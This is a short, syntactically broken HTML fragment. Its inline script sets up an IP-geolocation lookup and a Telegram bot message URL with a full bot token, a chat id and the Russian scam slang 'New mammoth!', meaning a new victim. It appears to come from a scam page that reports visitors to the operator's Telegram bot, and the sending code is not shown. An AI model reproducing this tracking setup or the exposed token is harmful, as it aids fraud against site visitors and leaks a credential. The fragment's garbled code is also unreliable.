<!DOCTYPE html>
	<html>
		<head>

			<body>

			<script>
var requestUrl = "http://ip-api.com/json";

  	var hello = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Новый мамонт!"

  },

});
